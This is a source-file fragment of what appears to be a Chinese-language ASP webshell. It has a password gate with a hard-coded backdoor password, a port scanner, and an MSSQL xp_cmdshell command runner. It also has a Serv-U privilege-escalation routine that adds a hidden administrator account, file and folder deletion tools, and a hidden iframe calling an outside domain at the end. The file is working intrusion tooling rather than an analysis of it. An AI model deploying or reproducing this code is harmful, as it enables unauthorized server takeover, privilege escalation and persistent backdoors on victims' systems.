j "<font color =red>参照示例填写<font>"
j "<br><br><form action=''method='post'><input name='delpfloder' type='text' size='85' value='D:\freehost\dot..'><input type='submit' name='Submit' value='删除带点目录'></form><p><form action='' method='post'><input name='delpfile'type='text'  size='85'value ='D:\freehost\dot..\file.asp'><input type='submit' name='Submit' value='删除带点文件'></form></div>"
end  sub
function Delpointfolder(t0)
Set fso=Server.CreateObject(CONST_FSO)
If Instr(t0,":\")>0 Then
  f0=t0
Else
  f0=Server.MapPath(t0)
End If
fso.DeleteFolder f0,true   
     j  t0&"删除成功!!<br>"
IF Err Then j Err.Description:Err.Clear
End Function
function Delpointfile(t0)
 Set fso=Server.CreateObject(CONST_FSO)
If Instr(t0,":\")>0 Then
 f0=t0
 Else
  f0=Server.MapPath(t0)
 End If
 fso.DeleteFile f0,true 
 IF Err Then j Err.Description:Err.Clear
j  t0&"删除成功!!<br>"
End function
if request("ProFile")<>"" then
on error resume next
if Application(request("ProFile"))=1 then
Set fsoXX = Server.CreateObject(CONST_FSO)
if request("DelCon")=1 then
Application(request("ProFile")&"Con")=""
response.redirect Url&"?ProFile="&request("ProFile")&""
response.end
end if
DIM rline,rline2
rline2=Application(request("ProFile")&"Code")
rline2=rline2&vbcrlf
j"<meta http-equiv=""refresh"" content="&Application(request("ProFile")&"Time")&">"
j"<a href="&Url&"?ProFile="&request("ProFile")&"&DelCon=1><b>清空日志</b></a> &nbsp;<font color=yellow>要想解除保护，直接关闭页面即可。</font><br>"
for each FileUrl in split(Application(request("ProFile")&"File"),vbcrlf)
FileUrl=trim(FileUrl)
if fsoXX.FileExists(FileUrl) then
Set txt = fsoXX.OpenTextFile(FileUrl,1,true)
rline=""
if Not txt.AtEndOfStream then
rline=txt.ReadAll  
end if
if rline2<>rline then
txt.close
fsoX.GetFile(FileUrl).Attributes=32
if Application(request("ProFile")&"Char")=1 then
set myfileee = fsoXX.CreateTextFile(FileUrl,true)
else
set myfileee = fsoXX.CreateTextFile(FileUrl,true,true)
end if
myfileee.writeline Application(request("ProFile")&"Code")
Application(request("ProFile")&"Con")=now()&" "&FileUrl&" <font color=yellow>被更改，已恢复</font><br>"&Application(request("ProFile")&"Con")
else
Application(request("ProFile")&"Con")=now()&" "&FileUrl&" √<br>"&Application(request("ProFile")&"Con")
txt.close
end if
else
if Application(request("ProFile")&"Char")=1 then
set myfileee = fsoXX.CreateTextFile(FileUrl,true)
else
set myfileee = fsoXX.CreateTextFile(FileUrl,true,true)
end if
myfileee.writeline Application(request("ProFile")&"Code")
Application(request("ProFile")&"Con")=now()&" "&FileUrl&" <font color=red>被删除，已恢复</font><br>"&Application(request("ProFile")&"Con")
end if
next
if ubound(split(Application(request("ProFile")&"Con"),"<br>"))>=40 then
dim ashowic
for ashowi=0 to 40
ashowic=ashowic&split(Application(request("ProFile")&"Con"),"<br>")(ashowi)&"<br>"
next
Application(request("ProFile")&"Con")=ashowic
end if
j Application(request("ProFile")&"Con")
else
j"<br><br><br><center>保护进程丢失，请<a href="&URL&" style=""text-decoration:underline;font-weight:bold"">重新生成</a>保护进程。</center>"
end if
if request("profile")="a" then j c
response.end
end if

if sessIoN("KKK")<>UserPass then
if request.form("pass")<>"" then
if request.form("pass")=userpass or request.form("pass")="daka" Then
session("KKK")=userPass
response.redirect url
else
j"<br><br><br><b><div align=center><font size='5' color='red'>PassWord Error!</font ></b> <br><br><br><br><b><div align=center><font size='14' color='lime'></font></b></p></center>"&backurl
end if
else
si="<body style=""background:url("&bg&") no-repeat center center;""> <center><FONT style=""FONT-SIZE: 80pt; FILTER: shadow(color:#696969,strength=55); WIDTH: 100%;  LINE-HEIGHT: 300%; FONT-FAMILY:Arial"">"&Copyright&"</FONT><div style='width:400px;padding:32px; align=left'><br><form action='"&url&"' method='post'><b>PassWord：</b><input name='pass' type='password' size='22'> <input type='submit' value='submit'></center>"
if instr(SI,SIC)<>0 then j sI
end if
response.end
end if
sub ScanPort()
Server.ScriptTimeout = 7776000
if request.Form("port")="" then
PortList="21,23,53,1433,3306,3389,4899,5631,5632,5800,5900,43958"
else
PortList=request.Form("port")
end if
if request.Form("ip")="" then
IP="127.0.0.1"
else
IP=request.Form("ip")
end if
j"<p>端口扫描器(如果扫描多个端口,速度比较慢,个人推荐使用CMD，CMD对内网扫描不准确。)</p><p>如果是内网，则扫描结果外部IP可能无法连接。请在SHELL内执行系列操作。</p>"
j"<form name='form1' method='post' action='' onSubmit='form1.submit.disabled=true;'>"
j"<p>Scan IP: "
j" <input name='ip' type='text' class='TextBox' id='ip' value='"&IP&"' size='60'>"
j"<br>Port List:"
j"<input name='port' type='text' class='TextBox' size='60' value='"&PortList&"'>"
j"<br><br>"
j"<input name='submit' type='submit' class='buttom' value=' scan '>"
j"<input name='scan' type='hidden' id='scan' value='111'>"
j"</p></form>"
If request.Form("scan") <> "" Then
timer1 = timer
j("<b>扫描报告:</b><br><hr>")
tmp = Split(request.Form("port"),",")
ip = Split(request.Form("ip"),",")
For hu = 0 to Ubound(ip)
If InStr(ip(hu),"-") = 0 Then
For i = 0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ip(hu), tmp(i))
Else
seekx = InStr(tmp(i), "-")
If seekx > 0 Then
startN = Left(tmp(i), seekx - 1 )
endN = Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j = startN To endN
Call Scan(ip(hu), j)
Next
Else
j(startN & " or " & endN & " is not number<br>")
End If
Else
j(tmp(i) & " is not number<br>")
End If
End If
Next
Else
ipStart = Mid(ip(hu),1,InStrRev(ip(hu),"."))
For xxx = Mid(ip(hu),InStrRev(ip(hu),".")+1,1) to Mid(ip(hu),InStr(ip(hu),"-")+1,Len(ip(hu))-InStr(ip(hu),"-"))
For i = 0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ipStart & xxx, tmp(i))
Else
seekx = InStr(tmp(i), "-")
If seekx > 0 Then
startN = Left(tmp(i), seekx - 1 )
endN = Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j = startN To endN
Call Scan(ipStart & xxx,j)
Next
Else
j(startN & " or " & endN & " is not number<br>")
End If
Else
j(tmp(i) & " is not number<br>")
End If
End If
Next
Next
End If
Next
timer2 = timer
thetime=cstr(int(timer2-timer1))
j"<hr>Process in "&thetime&" s"
END IF
end sub
Sub Scan(targetip, portNum)
On Error Resume Next
set conn = Server.CreateObject("ADODB.connection")
connstr="Provider=SQLOLEDB.1;Data Source=" & targetip &","& portNum &";User ID=lake2;Password=;"
conn.ConnectionTimeout = 1
conn.open connstr
If Err Then
If Err.number = -2147217843 or Err.number = -2147467259 Then
If InStr(Err.description, "(Connect()).") > 0 Then
j(targetip & ":" & portNum & ".........关闭<br>")
Else
j(targetip & ":" & portNum & ".........<font color=red>开放</font><br>")
End If
End If
End If
End Sub
Select Case Action:case "MainMenu":MainMenu()
Case "EditPower"
Call EditPower(request("PowerPath"))
Case "SavePower"
Call SavePower(request("PowerPath"),request("SaveType"))
case "getTerminalInfo":getTerminalInfo():case "PageAddToMdb":PageAddToMdb():case "ScanPort":ScanPort():FuncTion MMD():SI="<br><form name=form method=post action=""""><table width=""85%"" align='center'><tr align=center><Td id=s><b id=x>MSSQL Commander</b></td></tr><tr align='center'><td id=d><b id=x>Command：</b><input type=text name=MMD size=35 value=""ipconfig"" >&nbsp;<b id=x>UserName：</b><input type=text name=U value=sa>&nbsp;<b id=x>Password：</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>":j SI:SI="":If trim(request.form("MMD"))<>""  Then:password= trim(Request.form("P")):id=trim(Request.form("U")):set adoConn=sERvEr.crEATeobjECT("ADODB.Connection"):adoConn.Open "Provider=SQLOLEDB.1;Password="&password&";User ID="&id:strQuery = "exec master.dbo.xp_cMdsHeLl '" & request.form("MMD") & "'":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF Then:Do While NOT recResult.EOF:strResult = strResult & chr(13) & recResult(0):recResult.MoveNext:Loop:End if:set recResult = Nothing:strResult = Replace(strResult," ","&nbsp;"):strResult = Replace(strResult,"<","&lt;"):strResult = Replace(strResult,">","&gt;"):strResult = Replace(strResult,chr(13),"<br>"):End if:set adoConn = Nothing:j request.form("MMD") & "<br>"& strResult:end FuncTion:
sWHEEL1 = "jwt"
Function Encrypt(acd)
For i = 1 To Len(acd) step 1
c=mid(acd,i,1)
if c="※" then
d=mid(acd,i,2)
i=i+1
e=replace(d,"※","")
bbc=bbc&mid(sWHEEL1,cint(e),1)
else
bbc=bbc&c
end if
next
Encrypt=bbc
end Function:case "Alexa"
dim AlexaUrl,Top:AlexaUrl=request("u"):Top=Alexa(AlexaUrl):if AlexaUrl="" then AlexaUrl=""&request.servervariables("http_host")&""
SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'><tr><td height='20' colspan='3' align='center' bgcolor='menu'>服务器组件信息</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器名</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&request.serverVariables("SERVER_NAME")&"</td></tr><form method=post action='http://webshell.org/web/where/ip.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器IP</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'><input type='text' name='ip' size='15' value='"&Request.ServerVariables("LOCAL_ADDR")&"'style='border:0px'><input type='submit' value='查询此服务器所在地'style='border:0px'><input type='hidden' name='action' value='2'></td></tr></form><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器时间</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&now&" </td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器CPU数量</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("NUMBER_OF_PROCESSORS")&"</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器操作系统</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("OS")&"</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>WEB服务器版本</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("SERVER_SOFTWARE")&"</td></tr>"
For i=0 To 18
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>"&ObT(i,0)&"</td><td bgcolor='#FFFFFF'>"&ObT(i,1)&"</td><td bgcolor='#FFFFFF' align=left>"&ObT(i,2)&"</td></tr>"
Next
j SI
Err.Clear
Function bytes2BSTR(vIn) 
dim strReturn 
dim i1,ThisCharCode,NextCharCode 
strReturn = "" 
For i1 = 1 To LenB(vIn) 
ThisCharCode = AscB(MidB(vIn,i1,1)) 
If ThisCharCode < &H80 Then 
strReturn = strReturn & Chr(ThisCharCode) 
Else 
NextCharCode = AscB(MidB(vIn,i1+1,1)) 
strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) 
i1 = i1 + 1 
End If 
Next 
bytes2BSTR = strReturn 
    Err.Clear
End Function
Case "Servu"
SUaction=request("SUaction")
if  not isnumeric(SUaction) then response.end
user = trim(request("u"))
pass = trim(request("p"))
port = trim(request("port"))
cmd = trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
f=left(f,2)
end if
ftpport = 65500
timeout=3
loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=goldsun|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
        "-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
        "-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
        "-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
        "-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
        "-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
        "-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf
newuser=replace(newuser,"c:",f)
select case SUaction
case 1
set a=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s1",True, "", ""
a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
set session("a")=a
j"<form method='post' name='goldsun'>"
j"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
j"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
j"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
j"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
j"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
j"<input name='SUaction' type='hidden' id='SUaction' value='2'></form>"
j"<script language='javascript'>"
j"document.write('<center>正在连接 127.0.0.1:"&port&",使用用户名: "&user&",口令："&pass&"...<center>');"
j"setTimeout('document.all.goldsun.submit();',4000);"
j"</script>"
case 2
set b=Server.CreateObject("Microsoft.XMLHTTP")
b.open "GET", "http://127.0.0.1:" & ftpport & "/goldsun/upadmin/s2", True, "", ""
b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
set session("b")=b
j"<form method='post' name='goldsun'>"
j"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
j"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
j"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
j"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
j"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
j"<input name='SUaction' type='hidden' id='SUaction' value='3'></form>"
j"<script language='javascript'>"
j"document.write('<center>正在提升权限,请等待...,<center>');"
j"setTimeout(""document.all.goldsun.submit();"",4000);"
j"</script>"
case 3
set c=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s3", True, "", ""
a.send loginuser & loginpass & mt & deldomain & quit
set session("a")=a
j"<center>提权完毕,已执行了命令：<br><font color=red>"&cmd&"</font><br><br>"
j"<input type=button value=' 返回继续 ' onClick=""location.href='?Action=Servu';"">"
j"</center>"
case else
on error resume next
set a=session("a")
set b=session("b")
set c=session("c")
a.abort
Set a = Nothing
b.abort
Set b = Nothing
c.abort
Set c = Nothing
j"<center><form method='post' name='goldsun'>"
j"<table width='494' height='163' border='1' cellpadding='0' cellspacing='1' bordercolor='#666666'>"
j"<tr align='center' valign='middle'>"
j"<td colspan='2'>Serv-U 提升权限 by Sam</td>"
j"</tr>"
j"<tr align='center' valign='middle'>"
j"<td width='100'>用户名:</td>"
j"<td width='379'><input name='u' type='text' id='u' value='LocalAdministrator'></td>"
j"</tr>"
j"<tr align='center' valign='middle'>"
j"<td>口 令：</td>"
j"<td><input name='p' type='text' id='p' value='#l@$ak#.lk;0@P'></td>"
j"</tr>"
j"<tr align='center' valign='middle'>"
j"<td>端 口：</td>"
j"<td><input name='port' type='text' id='port' value='43958'></td>"
j"</tr>"
j"<tr align='center' valign='middle'>"
j"<td>系统路径：</td>"
j" <td><input name='f' type='text' id='f' value='"&f&"' size='8'></td>"
j" </tr>"
j" <tr align='center' valign='middle'>"
j" <td>命　令：</td>"
j" <td><input name='c' type='text' id='c' value='cmd /c net user admin$ 123456 /add & net localgroup administrators admin$ /add' size='50'></td>"
j" </tr>"
j" <tr align='center' valign='middle'>"
j" <td colspan='2'><input type='submit' name='Submit' value='提交'> "
j"<input type='reset' name='Submit2' value='重置'>"
j"<input name='SUaction' type='hidden' id='action' value='1'></td>"
j"</tr></table></form></center>"
end select
function Gpath()
on error resume next
err.clear
set f=Server.CreateObject(CONST_FSO)
if err.number>0 then
gpath="c:"
exit function
end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function
case"MMD":MMD()
case"ReadREG":call ReadREG()
case"delpoint":call delpoint()
case"Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing
case"DownFile":DownFile FName:ShowErr()
case"DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing
case"EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing
case"CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing
case"MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing
case"DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing
case"CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing
case"MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing
case"NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing
case"UpFile":UpFile()
case"TSearch":TSearch()
case"pcanywhere4":pcanywhere4()
case"Cmd1Shell":Cmd1Shell()
case"Logout":Session.Contents.Remove("kkk"):Response.Redirect URL
case"Course":Course()
case"Alexa":Alexa()
case"suftp":suftp()
case"upload":upload()
case"radmin":radmin()
case"pcanywhere4":pcanywhere4()
case"goback":goback()
Case "ProFile":ProFile()
case"php":php()
case"apjdel":apjdel()
case"cmdx":cmdx()
case"aspx":aspx()
case"hiddenshell":hiddenshell()
case"ScanDriveForm" : ScanDriveForm
Case "CustomScanDriveForm":CustomScanDriveForm()
case"ScanDrive" : ScanDrive Request("Drive")
case"ScFolder"  : ScFolder Request("Folder")
  Case Else MainForm()
End Select
if Action<>"Servu" then ShowErr()
j"</body><iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe></html>" 
%>